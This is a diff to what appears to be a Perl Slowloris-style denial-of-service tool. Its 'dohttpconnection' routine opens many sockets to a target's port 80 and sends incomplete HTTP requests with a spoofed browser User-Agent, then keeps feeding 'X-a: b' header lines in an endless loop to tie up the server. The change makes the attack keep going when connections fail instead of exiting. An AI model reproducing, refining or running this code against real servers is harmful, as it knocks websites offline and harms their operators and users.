@@ -98,23 +98,18 @@ sub dohttpconnection {
     while(1) {
         foreach my $i (1..$num){
             print "Building sockets.\n";
-            $sock[$i] = new IO::Socket::INET(
+            if($sock[$i] = new IO::Socket::INET(
                 PeerHost => "$target", 
                 PeerPort => '80', 
                 Proto => 'tcp'
-            );
-            die "Unable to connect to $target: $!\n" unless $sock[$i];
-            $primarypayload = "GET / HTTP/1.1\r\n"."Host: $target\r\n"."User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50313; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"."Content-Length: 42\r\n";
-            my $handle = $sock[$i];
-            if($handle) {
-                print $handle "$primarypayload";
+            )) {
+                $primarypayload = "GET / HTTP/1.1\r\n"."Host: $target\r\n"."User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50313; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"."Content-Length: 42\r\n";
+                my $handle = $sock[$i];
+                if($handle) {
+                    print $handle "$primarypayload";
+                    print $handle "X-a: b\r\n";
+                }
             }
         }
-        print "Sending data!!!\n";
-        foreach my $i (1..$num){
-            my $handle = $sock[$i];
-            print $handle "X-a: b\r\n";
-        }
-        #sleep(100);
     }
 }
